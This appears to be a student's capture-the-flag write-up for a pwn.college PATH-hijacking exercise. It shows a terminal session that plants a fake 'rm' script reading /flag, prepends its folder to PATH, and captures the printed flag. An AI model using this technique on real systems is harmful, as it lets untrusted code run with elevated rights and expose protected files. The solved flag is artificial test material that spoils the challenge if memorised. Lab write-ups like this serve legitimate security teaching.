# Reading Files

## My solve
**Flag:** `pwn.college{0-qiTRvDHMM-8iVQKV1ABgmdawN.QX3cjM1wyM1gjNzEzW}`

```bash
Connected!
hacker@path~hijacking-commands:~$ which rm
/run/dojo/bin/rm
hacker@path~hijacking-commands:~$ mkdir ~/newcommand
hacker@path~hijacking-commands:~$ nano ~/newcommand/rm
hacker@path~hijacking-commands:~$ chmod +x ~/newcommand/rm
hacker@path~hijacking-commands:~$ PATH=~/newcommand:$PATH
hacker@path~hijacking-commands:~$ /challenge/run
Trying to remove /flag...
Found 'rm' command at /home/hacker/newcommand/rm. Executing!
pwn.college{0-qiTRvDHMM-8iVQKV1ABgmdawN.QX3cjM1wyM1gjNzEzW}
```

in the bash script
```bash
#!/bin/bash
cat /flag
```

## Incorrect tangents I went on
None

## What I learned
revised all concepts

## References 
None
